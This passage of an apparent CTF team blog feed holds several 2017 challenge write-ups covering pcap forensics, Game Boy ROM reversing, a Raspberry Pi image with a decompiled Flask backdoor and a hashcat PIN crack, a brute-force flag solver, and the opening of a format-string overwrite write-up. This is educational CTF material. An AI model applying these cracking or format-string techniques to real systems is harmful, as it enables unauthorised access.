      <category term="pwn2winctf" scheme="https://teamrocketist.github.io/tags/pwn2winctf/"/>
    
      <category term="sandbox" scheme="https://teamrocketist.github.io/tags/sandbox/"/>
    
      <category term="regex" scheme="https://teamrocketist.github.io/tags/regex/"/>
    
  </entry>
  
  <entry>
    <title>[Forensics] Square CTF - Sniffed Off the Wire</title>
    <link href="https://teamrocketist.github.io/2017/10/16/Forensics-Square-CTF-Sniffed-Off-the-Wire/"/>
    <id>https://teamrocketist.github.io/2017/10/16/Forensics-Square-CTF-Sniffed-Off-the-Wire/</id>
    <published>2017-10-16T18:26:03.000Z</published>
    <updated>2017-10-16T18:35:02.283Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Sniffed Off the Wire<br>🚩<br>Sifting through the noise<br>100 points<br>Forensics<br><br>After weeks of perching, our avian operatives captured a suspicious network flow. Maybe there’s valuable data inside?<br><a href="https://cdn.squarectf.com/challenges/sniffed-off-the-wire.pcap" target="_blank" rel="external">https://cdn.squarectf.com/challenges/sniffed-off-the-wire.pcap</a><br></blockquote>

<p>We have pcap analysing it in wireshark, if we follow the tcp stream we can see alot of strange characters:<br><a data-fancybox="gallery" href="https://i.imgur.com/HrSWCVj.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/HrSWCVj.png" alt=""><br></a><br>This strange characters are known as terminal characters, they can do alot of things like changing the color printed in the terminal and do alot of other stuff. If we print some characters like this in the terminal with c/python/perl/ruby etc:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">bcolors</span>:</span></div><div class="line">    HEADER = <span class="string">'\033[95m'</span> <span class="keyword">with</span></div><div class="line">    OKBLUE = <span class="string">'\033[94m'</span></div><div class="line">    OKGREEN = <span class="string">'\033[92m'</span></div><div class="line">    WARNING = <span class="string">'\033[93m'</span></div><div class="line">    FAIL = <span class="string">'\033[91m'</span></div><div class="line">    ENDC = <span class="string">'\033[0m'</span></div><div class="line">    BOLD = <span class="string">'\033[1m'</span></div><div class="line">    UNDERLINE = <span class="string">'\033[4m'</span></div><div class="line"><span class="keyword">print</span> bcolors.WARNING + <span class="string">"Warning: No active frommets remain. Continue?"</span> + bcolors.ENDC</div></pre></td></tr></table></figure>
<p>It’s going to print the text as yellow in the terminal, those characters on wireshark will do same but with another functions not just changing the color, first we need to decode all this hex decimal in the data field of each <code>TCP</code> package:<br><a data-fancybox="gallery" href="https://i.imgur.com/USynWoq.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/USynWoq.png" alt=""><br></a><br>Lets use bash to get all the hexadecimal and convert it to text:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tshark -r sniffed-off-the-wire.pcap -Y <span class="string">"data"</span> -Tfields -e data.data | tr -d <span class="string">':|\n'</span> | xxd -r -p</div></pre></td></tr></table></figure>
<p>Those characters are actually writing the flag and then delete it, I actually needed to print-screen the terminal, with this I ended up getting the flag:<br><a data-fancybox="gallery" href="https://i.imgur.com/0uQFjce.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/0uQFjce.png" alt=""><br></a></p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;Sniffed Off the Wire&lt;br&gt;🚩&lt;br&gt;Sifting through the noise&lt;br&gt;100 points&lt;br&gt;Forensics&lt;br&gt;&lt;br&gt;After weeks of perching, our avian
    
    </summary>
    
      <category term="Forensics" scheme="https://teamrocketist.github.io/categories/Forensics/"/>
    
    
      <category term="forensics" scheme="https://teamrocketist.github.io/tags/forensics/"/>
    
      <category term="wireshark" scheme="https://teamrocketist.github.io/tags/wireshark/"/>
    
      <category term="tshark" scheme="https://teamrocketist.github.io/tags/tshark/"/>
    
      <category term="terminal_characters" scheme="https://teamrocketist.github.io/tags/terminal-characters/"/>
    
      <category term="squarectf" scheme="https://teamrocketist.github.io/tags/squarectf/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] Square CTF - The Turing Agent</title>
    <link href="https://teamrocketist.github.io/2017/10/16/Reverse-Square-CTF-The-Turing-Agent/"/>
    <id>https://teamrocketist.github.io/2017/10/16/Reverse-Square-CTF-The-Turing-Agent/</id>
    <published>2017-10-16T00:08:25.000Z</published>
    <updated>2017-10-17T06:44:24.905Z</updated>
    
    <content type="html"><![CDATA[<blockquote>The Turing Agent<br><br>A Small Gameboy CTF<br>500 points<br>Reverse<br><br>The hamsters have triumphed! We found an open Github repository (<a href="https://github.com/Ahris/the_turing_agent)!" target="_blank" rel="external">https://github.com/Ahris/the_turing_agent)!</a> It looks like some sort of game; perhaps they’re planning to trick our humans into playing it. We need to know if there’s any data hidden in the game that might harm our humans.<br><br>Note: You’ll need to prepend “flag-“ to the flag.<br></blockquote>

<p>A game boy classic rom to analyse, at first I tried to search in the web for a nice debugger for this and most people online were recommending to use <a href="http://bgb.bircd.org/" target="_blank" rel="external">http://bgb.bircd.org/</a> classifying it as the best, well unfortunately I didn’t manage to understand this debugger very well so once again searching in the web I found a much more intuitive debugger named No$GMB (<a href="http://problemkaputt.de/gmb.htm" target="_blank" rel="external">http://problemkaputt.de/gmb.htm</a>) with this one it was much easier to solve the challenge.</p>
<p>Opening the rom with No$GMB we can see that the game starts we get some conversation until we reach a locked door which requires a code (combination of multiple gameboy keys), if we get the correct combination we can get the flag:<br><a data-fancybox="gallery" href="https://i.imgur.com/RfAUXmN.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/RfAUXmN.png" alt=""><br></a></p>
<p>As you can see in the image above I put a break point at <code>0x337C</code> which is a jump, I did a break point here because I noticed its some kind of a loop which will only end when all the keys are inserted to unlock the door so my plan was not to actually understand how the architecture of the gameboy works but to try to bypass the combination verification by changing the flags of jump instructions and try to find the winner function:<br><a data-fancybox="gallery" href="https://i.imgur.com/GFSYeFY.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/GFSYeFY.png" alt=""><br></a><br>To avoid being stuck in the loop without pressing any keys we can just disable the carry flag and it will not jump as we can see in the image bellow the “[]” disappears:<br><a data-fancybox="gallery" href="https://i.imgur.com/FVd1mXW.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/FVd1mXW.png" alt=""><br></a><br>This is how I manipulated the game, by changing the control flow of the program to try to jump into a winner function, after multiple steps I ended up in the final road to finish the challenge as you can see bellow:<br><a data-fancybox="gallery" href="https://i.imgur.com/jRxSeqm.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/jRxSeqm.png" alt=""><br></a><br>By going to the next lines of the conversation we got the flag:<br><a data-fancybox="gallery" href="https://i.imgur.com/Su2uxAW.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/Su2uxAW.png" alt=""><br></a></p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;The Turing Agent&lt;br&gt;&lt;br&gt;A Small Gameboy CTF&lt;br&gt;500 points&lt;br&gt;Reverse&lt;br&gt;&lt;br&gt;The hamsters have triumphed! We found an open Github
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="squarectf" scheme="https://teamrocketist.github.io/tags/squarectf/"/>
    
      <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
    
      <category term="gameboy" scheme="https://teamrocketist.github.io/tags/gameboy/"/>
    
      <category term="no$gmb" scheme="https://teamrocketist.github.io/tags/no-gmb/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] Kaspersky Industrial CTF Quals 2017 - Backdoor Pi</title>
    <link href="https://teamrocketist.github.io/2017/10/08/Reverse-Kaspersky-Industrial-CTF-Quals-2017-Backdoor-Pi/"/>
    <id>https://teamrocketist.github.io/2017/10/08/Reverse-Kaspersky-Industrial-CTF-Quals-2017-Backdoor-Pi/</id>
    <published>2017-10-08T15:00:48.000Z</published>
    <updated>2017-10-08T16:05:31.881Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>We are doing an project for a school competition in which we need to use a Raspberry Pi to make an IOT prototype. We received SD cards from the professor, and because we lost ours we asked another group to give us a copy of their card, I know it’s been modified because the original hash doesn’t match. Could you please investigate and tell me if everything is ok? Here is some parts of the file system:<br><br>FLAG FORMAT: KLCTF{flag}<br><br>download this file: <a href="https://s3.eu-central-1.amazonaws.com/klctf/fs.zip" target="_blank" rel="external">https://s3.eu-central-1.amazonaws.com/klctf/fs.zip</a><br></blockquote>

<p>By reading the description we know the attacker added some kind of backdoor our first intuition was to check the crontab files:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ ls var/spool/cron/crontabs/</div><div class="line">b4ckd00r_us3r  pi</div></pre></td></tr></table></figure>
<p>By checking the b4ckd00r_us3r we found out the backdoor is running in this cron task:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">cat var/spool/cron/crontabs/b4ckd00r_us3r </div><div class="line"># DO NOT EDIT THIS FILE - edit the master and reinstall.</div><div class="line"># (/tmp/crontab.80NKS4/crontab installed on Wed Oct  4 19:28:12 2017)</div><div class="line"># (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)</div><div class="line"># m h  dom mon dow   command</div><div class="line">@reboot python /bin/back</div></pre></td></tr></table></figure>
<p>By checking what kind of file /bin/back is: </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ file bin/back</div><div class="line">bin/back: python 2.7 byte-compiled</div></pre></td></tr></table></figure>
<p>It’s a python compiled file we used <a href="uncompyle2">https://github.com/wibiti/uncompyle2</a> to uncompyle and we got this:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># uncompyle6 version 2.12.0</span></div><div class="line"><span class="comment"># Python bytecode 2.7 (62211)</span></div><div class="line"><span class="comment"># [GCC 6.3.0 20170118]</span></div><div class="line"><span class="comment"># Embedded file name: back.py</span></div><div class="line"><span class="comment"># Compiled at: 2017-10-05 09:09:10</span></div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</div><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</div><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> abort</div><div class="line"><span class="keyword">import</span> hashlib</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_creds</span><span class="params">(user, pincode)</span>:</span></div><div class="line">    <span class="keyword">if</span> len(pincode) &lt;= <span class="number">8</span> <span class="keyword">and</span> pincode.isdigit():</div><div class="line">        val = <span class="string">'&#123;&#125;:&#123;&#125;'</span>.format(user, pincode)</div><div class="line">        key = hashlib.sha256(val).hexdigest()</div><div class="line">        <span class="keyword">if</span> key == <span class="string">'34c05015de48ef10309963543b4a347b5d3d20bbe2ed462cf226b1cc8fff222e'</span>:</div><div class="line">            <span class="keyword">return</span> <span class="string">'Congr4ts, you found the b@ckd00r. The fl4g is simply : &#123;&#125;:&#123;&#125;'</span>.format(user, pincode)</div><div class="line">    <span class="keyword">return</span> abort(<span class="number">404</span>)</div><div class="line"></div><div class="line"></div><div class="line">app = Flask(__name__)</div><div class="line"></div><div class="line"><span class="meta">@app.route('/')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> <span class="string">'&lt;h1&gt;HOME&lt;/h1&gt;'</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">@app.route('/backdoor')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">backdoor</span><span class="params">()</span>:</span></div><div class="line">    user = request.args.get(<span class="string">'user'</span>)</div><div class="line">    pincode = request.args.get(<span class="string">'pincode'</span>)</div><div class="line">    <span class="keyword">return</span> check_creds(user, pincode)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    app.run(threaded=<span class="keyword">True</span>, host=<span class="string">'0.0.0.0'</span>, port=<span class="number">3333</span>)</div><div class="line"><span class="comment"># okay decompiling back.pyc</span></div></pre></td></tr></table></figure>
<p>We have a hash and we know it is composed in the following format:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">user:pincode</div></pre></td></tr></table></figure>
<p>Checking the user in /etc/passwd</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">root:x:0:0:root:/root:/bin/bash</div><div class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</div><div class="line">bin:x:2:2:bin:/bin:/bin/sh</div><div class="line">sys:x:3:3:sys:/dev:/bin/sh</div><div class="line">sync:x:4:65534:sync:/bin:/bin/sync</div><div class="line">games:x:5:60:games:/usr/games:/bin/sh</div><div class="line">man:x:6:12:man:/var/cache/man:/bin/sh</div><div class="line">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</div><div class="line">mail:x:8:8:mail:/var/mail:/bin/sh</div><div class="line">news:x:9:9:news:/var/spool/news:/bin/sh</div><div class="line">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</div><div class="line">proxy:x:13:13:proxy:/bin:/bin/sh</div><div class="line">www-data:x:33:33:www-data:/var/www:/bin/sh</div><div class="line">backup:x:34:34:backup:/var/backups:/bin/sh</div><div class="line">list:x:38:38:Mailing List Manager:/var/list:/bin/sh</div><div class="line">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</div><div class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</div><div class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</div><div class="line">libuuid:x:100:101::/var/lib/libuuid:/bin/sh</div><div class="line">pi:x:1000:1000:,,,:/home/pi:/bin/bash</div><div class="line">sshd:x:101:65534::/var/run/sshd:/usr/sbin/nologin</div><div class="line">ntp:x:102:104::/home/ntp:/bin/false</div><div class="line">statd:x:103:65534::/var/lib/nfs:/bin/false</div><div class="line">messagebus:x:104:106::/var/run/dbus:/bin/false</div><div class="line">usbmux:x:105:46:usbmux daemon,,,:/home/usbmux:/bin/false</div><div class="line">lightdm:x:106:109:Light Display Manager:/var/lib/lightdm:/bin/false</div><div class="line">avahi:x:107:110:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false</div><div class="line">b4ckd00r_us3r:x:1001:1004::/home/b4ckd00r_us3r:/bin/bash</div></pre></td></tr></table></figure>
<p>The user is b4ckd00r_us3r we just need to bruteforce the pincode by looking at the code we know the pincode must be between 1 and 8 numbers using hashcat to crack the hash:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line">$ cat kasperskyhash </div><div class="line">34c05015de48ef10309963543b4a347b5d3d20bbe2ed462cf226b1cc8fff222e</div><div class="line">$ cat example.dict </div><div class="line">b4ckd00r_us3r:</div><div class="line">$ hashcat -D 1,2 -m 1400 -a 6 -i --increment-min 1 --increment-max 8 kasperskyhash example.dict <span class="string">"?d?d?d?d?d?d?d?d"</span></div><div class="line">Session..........: hashcat                                </div><div class="line">Status...........: Exhausted</div><div class="line">Hash.Type........: SHA-256</div><div class="line">Hash.Target......: 34c05015de48ef10309963543b4a347b5d3d20bbe2ed462cf22...ff222e</div><div class="line">Time.Started.....: Sun Oct  8 16:23:46 2017 (3 mins, 27 secs)</div><div class="line">Time.Estimated...: Sun Oct  8 16:27:13 2017 (0 secs)</div><div class="line">Guess.Base.......: File (example.dict), Left Side</div><div class="line">Guess.Mod........: Mask (?d?d?d?d?d?d?d) [7], Right Side</div><div class="line">Guess.Queue.Base.: 1/1 (100.00%)</div><div class="line">Guess.Queue.Mod..: 7/8 (87.50%)</div><div class="line">Speed.Dev.<span class="comment">#1.....:    45759 H/s (0.29ms)</span></div><div class="line">Speed.Dev.<span class="comment">#2.....:        0 H/s (0.00ms)</span></div><div class="line">Speed.Dev.<span class="comment">#*.....:    45759 H/s</span></div><div class="line">Recovered........: 0/1 (0.00%) Digests, 0/1 (0.00%) Salts</div><div class="line">Progress.........: 10000000/10000000 (100.00%)</div><div class="line">Rejected.........: 0/10000000 (0.00%)</div><div class="line">Restore.Point....: 0/1 (0.00%)</div><div class="line">Candidates.<span class="comment">#1....: b4ckd00r_us3r:8939393 -&gt; b4ckd00r_us3r:9579393</span></div><div class="line">Candidates.<span class="comment">#2....: [Copying]</span></div><div class="line">HWMon.Dev.<span class="comment">#1.....: Temp: 64c Fan: 46%</span></div><div class="line">HWMon.Dev.<span class="comment">#2.....: N/A</span></div><div class="line"></div><div class="line">Dictionary cache hit:</div><div class="line">* Filename..: example.dict</div><div class="line">* Passwords.: 1</div><div class="line">* Bytes.....: 15</div><div class="line">* Keyspace..: 100000000</div><div class="line"></div><div class="line">- Device <span class="comment">#2: autotuned kernel-accel to 160                </span></div><div class="line">- Device <span class="comment">#2: autotuned kernel-loops to 204</span></div><div class="line">- Device <span class="comment">#1: autotuned kernel-accel to 22                 </span></div><div class="line">- Device <span class="comment">#1: autotuned kernel-loops to 23</span></div><div class="line">[s]tatus [p]ause [r]esume [b]ypass [c]heckpoint [q]uit =&gt; The wordlist or mask that you are using is too small.</div><div class="line">This means that hashcat cannot use the full parallel power of your device(s).</div><div class="line">Unless you supply more work, your cracking speed will drop.</div><div class="line">For tips on supplying more work, see: https://hashcat.net/faq/morework</div><div class="line"></div><div class="line">Approaching final keyspace - workload adjusted.           </div><div class="line"></div><div class="line">34c05015de48ef10309963543b4a347b5d3d20bbe2ed462cf226b1cc8fff222e:<span class="variable">$HEX</span>[6234636b643030725f757333723a3132313731333337]</div><div class="line">$ cat ~/.hashcat/hashcat.potfile | tail -1</div><div class="line">34c05015de48ef10309963543b4a347b5d3d20bbe2ed462cf226b1cc8fff222e:<span class="variable">$HEX</span>[6234636b643030725f757333723a3132313731333337]</div></pre></td></tr></table></figure>
<p>After a while it cracks, hashcat outputs the password in hex so lets decode it with bash:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ <span class="built_in">echo</span> <span class="string">'6234636b643030725f757333723a3132313731333337'</span> | xxd -r -p</div><div class="line">b4ckd00r_us3r:12171337</div></pre></td></tr></table></figure>
<p>The flag was </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">KLCTF&#123;b4ckd00r_us3r:12171337&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;We are doing an project for a school competition in which we need to use a Raspberry Pi to make an IOT prototype. We receive
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="python" scheme="https://teamrocketist.github.io/tags/python/"/>
    
      <category term="bruteforce" scheme="https://teamrocketist.github.io/tags/bruteforce/"/>
    
      <category term="compiled" scheme="https://teamrocketist.github.io/tags/compiled/"/>
    
      <category term="hashcat" scheme="https://teamrocketist.github.io/tags/hashcat/"/>
    
      <category term="sha256" scheme="https://teamrocketist.github.io/tags/sha256/"/>
    
      <category term="kasperskyCtf" scheme="https://teamrocketist.github.io/tags/kasperskyCtf/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] BackdoorCTF 2017 - NO-CALM</title>
    <link href="https://teamrocketist.github.io/2017/09/26/Reverse-BackdoorCTF-2017-NO-CALM/"/>
    <id>https://teamrocketist.github.io/2017/09/26/Reverse-BackdoorCTF-2017-NO-CALM/</id>
    <published>2017-09-26T11:09:07.000Z</published>
    <updated>2017-09-26T11:17:04.585Z</updated>
    
    <content type="html"><![CDATA[<p>Reverse challenge, using IDA to convert the binary into c pseudo code:<br><a data-fancybox="gallery" href="https://i.imgur.com/7mmkV78.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/7mmkV78.png" alt=""><br></a></p>
<p>We can see that the flag must be in the arguments of the flag, each byte of the flag will be an argv, the flag has 31 bytes as we can see in <code>if</code> check. Looking at the generated code we can see that each byte of the flag is being saved from the variable v6 to v35. After this we can see a bunch of <code>if</code> verifications:<br><a data-fancybox="gallery" href="https://i.imgur.com/jwvteoW.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/jwvteoW.png" alt=""><br></a><br>We can see it checks 3 bytes at time, with 3 different operation checks:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(v7+v6-v8 == key[<span class="number">0</span>] &amp;&amp; v6-v7+v8 == key[<span class="number">1</span>] &amp;&amp; v7-v6+v8 == key[<span class="number">2</span>]) == <span class="literal">true</span></div></pre></td></tr></table></figure>
<p>And this repeats for all 3 bytes along the flag… it’s simple to write a python script to brute force the flag:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> string</div><div class="line"></div><div class="line">a =  string.printable</div><div class="line">keys = [<span class="number">81</span>,<span class="number">53</span>,<span class="number">87</span>,<span class="number">90</span>,<span class="number">156</span>,<span class="number">66</span>,<span class="number">98</span>,<span class="number">140</span>,<span class="number">92</span>,<span class="number">38</span>,<span class="number">170</span>,<span class="number">60</span>,<span class="number">29</span>,<span class="number">161</span>,<span class="number">69</span>,<span class="number">163</span>,<span class="number">27</span>,<span class="number">69</span>,<span class="number">147</span>,<span class="number">43</span>,<span class="number">59</span>,<span class="number">146</span>,<span class="number">86</span>,<span class="number">44</span>,<span class="number">67</span>,<span class="number">89</span>,<span class="number">75</span>,<span class="number">117</span>,<span class="number">125</span>,<span class="number">125</span>]</div><div class="line">flags = []</div><div class="line">s = <span class="string">''</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(keys),<span class="number">3</span>):</div><div class="line">	<span class="keyword">for</span> b <span class="keyword">in</span> a:</div><div class="line">		<span class="keyword">for</span> c <span class="keyword">in</span> a:</div><div class="line">			<span class="keyword">for</span> d <span class="keyword">in</span> a:</div><div class="line">				<span class="keyword">if</span> ord(c)+ord(b)-ord(d) == keys[i] <span class="keyword">and</span> ord(b)-ord(c)+ord(d) == keys[i+<span class="number">1</span>] <span class="keyword">and</span> ord(c)-ord(b)+ord(d) == keys[i+<span class="number">2</span>]:</div><div class="line">					s += b+c+d</div><div class="line">					<span class="keyword">print</span> s</div></pre></td></tr></table></figure>
<p>Running it:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">$ python nocalm.py </div><div class="line">CTF</div><div class="line">CTF&#123;No</div><div class="line">CTF&#123;Now_t</div><div class="line">CTF&#123;Now_th1s</div><div class="line">CTF&#123;Now_th1s_1s</div><div class="line">CTF&#123;Now_th1s_1s_t0</div><div class="line">CTF&#123;Now_th1s_1s_t0_g3</div><div class="line">CTF&#123;Now_th1s_1s_t0_g3t_A</div><div class="line">CTF&#123;Now_th1s_1s_t0_g3t_ANGR</div><div class="line">CTF&#123;Now_th1s_1s_t0_g3t_ANGRyy&#125;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Reverse challenge, using IDA to convert the binary into c pseudo code:&lt;br&gt;&lt;a data-fancybox=&quot;gallery&quot; href=&quot;https://i.imgur.com/7mmkV78.pn
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="backdoorctf" scheme="https://teamrocketist.github.io/tags/backdoorctf/"/>
    
      <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] BackdoorCTF 2017 - baby0x41414141</title>
    <link href="https://teamrocketist.github.io/2017/09/25/Pwn-BackdoorCTF-2017-baby0x41414141/"/>
    <id>https://teamrocketist.github.io/2017/09/25/Pwn-BackdoorCTF-2017-baby0x41414141/</id>
    <published>2017-09-25T04:46:07.000Z</published>
    <updated>2017-10-05T02:52:19.667Z</updated>
    
    <content type="html"><![CDATA[<p><a data-fancybox="gallery" href="https://i.imgur.com/pX6qbFQ.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/pX6qbFQ.png" alt=""><br></a><br><em>1.1 - format string vulnerability.</em></p>
<p>We have a format string vulnerability we can confirm this by running the binary:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ ./32_new </div><div class="line">Hello baby pwner, whats your name?</div><div class="line">%x</div><div class="line">Ok cool, soon we will know whether you pwned it or not. Till <span class="keyword">then</span> Bye 8048914</div></pre></td></tr></table></figure>
<p>A there it is, we leaked an address from the stack, analysing the binary again we can see we already have a cool function that calls <code>system(&#39;cat flag.txt&#39;)</code> so we don’t have to actually leak libc addresses and go through all that trouble:<br><a data-fancybox="gallery" href="https://i.imgur.com/TIY3ZzO.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/TIY3ZzO.png" alt=""><br></a><br><em>1.2 - flag function.</em></p>
<p>This one is really simple:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1 - Calculate the offset of the address we put in the stack using %p.</div><div class="line">2 - Modify the exit function address with flag function using %n.</div></pre></td></tr></table></figure>
<p>Before going into an explanation I’ll show you some modifiers from <code>printf</code> man page this will be useful since we want to override a certain number of bytes and this length modifiers will help us on that.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">An optional length modifier, that specifies the size of the argument.</div><div class="line">         The following length modifiers are valid for the d, i, n, o, u, x, or</div><div class="line">         X conversion:</div><div class="line"></div><div class="line">         Modifier          d, i           o, u, x, X            n</div><div class="line">         hh                signed char    unsigned char         signed char *</div><div class="line">         h                 short          unsigned short        short *</div><div class="line">         l (ell)           long           unsigned long         long *</div><div class="line">         ll (ell ell)      long long      unsigned long long    long long *</div><div class="line">         j                 intmax_t       uintmax_t             intmax_t *</div><div class="line">         t                 ptrdiff_t      (see note)            ptrdiff_t *</div><div class="line">         z                 (see note)     size_t                (see note)</div><div class="line">         q (deprecated)    quad_t         u_quad_t              quad_t *</div></pre></td></tr></table></figure>
<p>For example if we want to override an address like this <code>0x0804870b</code> this a 32 bit address so if we need to change all the bits we would use <code>%ln</code> which is a long and it’s 32 bits or we could even use <code>%lln</code> would work too since is 64 bit (long long). </p>
